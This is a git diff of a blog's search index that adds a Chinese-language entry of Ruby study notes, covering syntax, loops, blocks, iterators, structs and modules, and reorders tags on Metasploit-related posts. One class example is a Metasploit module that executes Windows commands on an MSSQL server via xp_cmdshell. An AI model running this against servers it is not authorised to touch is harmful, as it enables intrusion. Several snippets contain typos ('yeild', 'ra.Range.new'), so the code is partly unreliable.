@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Ruby语言学习笔记]]></title>
+    <url>%2F2019%2F01%2F15%2FRuby%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
+    <content type="text"><![CDATA[Ruby语言学习笔记 常量：[A-Z]开头 只能够被赋值一次 局部变量：[a-z] | _ 开头 类变量：@@ 实例变量：@ 全局变量：$ 特殊变量 逻辑运算 三目运算符a=((1==2) ? &quot;true&quot; : &quot;false&quot;) 分支结构 123if a&lt;0 then print "i love you"end 12345if a&lt;0 then puts "i love you"else puts "i don't love you"end 12345unless a&lt;0 then # unless语句是if语句的否定版 puts "i love you"else puts "i don't love you"end 1234567if a&lt;0 then puts "i love you"elsif a&gt;1 then puts "i don't love you"else puts "you are so foolish"end 多分支结构 123456789a = 1case awhen a&lt;0 puts "i love you"when a&gt;1 puts "i don't love you"elseputs "this is a test"end 循环语句 123while a&lt;1 puts "i love you"end 单行循环 12a = 1(puts i;i+=1) while i&lt;=3 until循环 123until a&lt;1 puts "i love you"end for循环 1234a = 1for a in 1..3 puts aend 循环控制 1234break #结束循环next # 同continueredo # 重做本次循环，不检查循环条件retry # 重做循环，从头开始 打印输出 12put "i love you" # 换行print "i love you" # 不换行 函数使用： 123def ruby puts("i love you")end 块 12345&#123; puts "i love you"&#125;# ordo puts "i love you"end 123456789101112def test_block puts "Start" yield yield puts "End"endtest_block &#123;puts "test_1"&#125;test_block do puts "test_2" puts "test_3"end 带参数1234567def test_block puts "Start" yield(1,2) yeild(2,3) puts "End"endtest_block &#123;|a,b| puts a+b&#125; 迭代器 1234567891011123.times&#123; puts "i love you"&#125; #循环3次puts "------------------"1.upto(9)&#123;|i| print i if i&lt;6&#125; #从1到9的循环满足if条件的输出puts "------------------"1.upto(9) do |x| #同上 print x," "end9.downto(1)&#123;|i| print i if i&lt;6&#125; #从9到1的循环满足if条件的输出puts "------------------"0.step(12,3)&#123;|i| print i&#125;(1..9).each&#123;|i| print i if i&lt;6&#125; #从1到9中取出满足条件的数[1,2,3,4,5,6].each&#123;|var| print var," "&#125; #打印集合中的元素 编写简单的迭代器123456def repeat(num,s) while num&gt;0 yeild(s) endendrepeat(3,"i love you") &#123;|s| puts s&#125; 过程对象（可以作为参数传递） 12345678910def test(p) puts "Start" p.call puts "End"endt=proc&#123; puts "i love you"&#125;test(t)test(proc&#123;puts "Do you live me?"&#125;) 类的使用 12345678910111213141516171819202122232425262728class MetasploitModule &lt; Msf::Auxiliary #类‘MetasploitModule’继承‘Msf::Auxiliary’ include Msf::Exploit::Remote::MSSQL # include 引用核心库中的MSSQL def initialize(info = &#123;&#125;) super(update_info(info, 'Name' =&gt; 'Microsoft SQL Server xp_cmdshell Command Execution', 'Description' =&gt; %q&#123; This module will execute a Windows command on a MSSQL/MSDE instance via the xp_cmdshell procedure. A valid username and password is required to use this module &#125;, 'Author' =&gt; [ 'tebo &lt;tebo[at]attackresearch.com&gt;' ], 'License' =&gt; MSF_LICENSE, 'References' =&gt; [ [ 'URL', 'http://msdn.microsoft.com/en-us/library/cc448435(PROT.10).aspx'], ] )) register_options( [ OptString.new('CMD', [ false, 'Command to execute', 'cmd.exe /c echo OWNED &gt; C:\\owned.exe']), ]) end def run mssql_xpcmdshell(datastore['CMD'], true) if mssql_login_datastore endend 数据类型 正常的就不演示了，下面是几个特殊的用法 1234puts 123_23 # 结果:12323 整形中的下划线会被自动省去puts 023 #0-八进制puts 0x4f #0x-十六进制puts 0b101010101 #0b-表示二进制 这段没有试成功，还不知道是为什么 数值的常用方法 数学计算方法 12Math.cos() #类似这种的使用的时候是用的Math库# 目前还不需要这一块的内容，以后需要了再看吧 字符串 操作一大堆，翻书查资料去吧12345678#!/usr/bin/rubya = "i loVe you"p ap a.upcasep afoo = a.upcase!p foop a 正则表达式 日期和时间 散列表 区间的概念 12ra.Range.new(1,5,true) # 这里的true是控制是否包含最后一个值（这里是‘5’）ra.each &#123;|i| p i&#125; 数组 结构体 12345678910111213#!/usr/bin/rubyg = Struct.new("Girl", :name, :age, :love)student = g.new("zhangsan", 22, "true")p student.valuesp student[0]p student[-1]p student.lengthp student.sizep student.membersp student.valuesp student.to_ap student.values_at(0,1) 数据类型转换 to_ary to_hash to_int to_s to_str to_f to_i和to_i(base) 模块 （不能实例化，可以调用） 12345678910111213141516171819#!/usr/bin/rubymodule My NA = "China" def My.set_name(name) @name=name end def My.get_name return @name end def My.set_age @age=age endendMy.set_name("zhangsan")p My.get_namep My::NA Mixin 在类中使用某个模块123class Test include MY # 这应用的是上一个例子中的moduleend 引用其他模块 1require 'msf/core' # 此功能类似于C语言中的include，这里可以直接是要引入的模块文件的文件名 线程 123456789#!/usr/bin/rubyThread.start&#123; while true puts 'Thread 1' end&#125;while true puts 'Thread 2'end 其他用法 线程同步，互斥，共享数据保护等 这一篇就到这后面的文件操作、数据库操作、桌面应用、web开发等详细内容，参见《Ruby入门权威指南》于天恩的书上的内容，这个笔记也是根据这个书的讲解顺序记录了一部分我目前需要掌握的部分]]></content>
+      <categories>
+        <category>编程</category>
+      </categories>
+      <tags>
+        <tag>Ruby</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[阶段总结]]></title>
     <url>%2F2019%2F01%2F14%2F%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93-1%2F</url>
     <content type="text"><![CDATA[这一部分是将之前写到CSDN上的博客全都搬了过来，争取以后再写的时候两边可以同时上传]]></content>
@@ -357,8 +368,8 @@
       </categories>
       <tags>
         <tag>Metasploit</tag>
-        <tag>meterpreter</tag>
         <tag>MS08-067</tag>
+        <tag>meterpreter</tag>
       </tags>
   </entry>
   <entry>
@@ -370,8 +381,8 @@
       </categories>
       <tags>
         <tag>Metasploit</tag>
-        <tag>木马</tag>
         <tag>meterpreter</tag>
+        <tag>木马</tag>
       </tags>
   </entry>
   <entry>
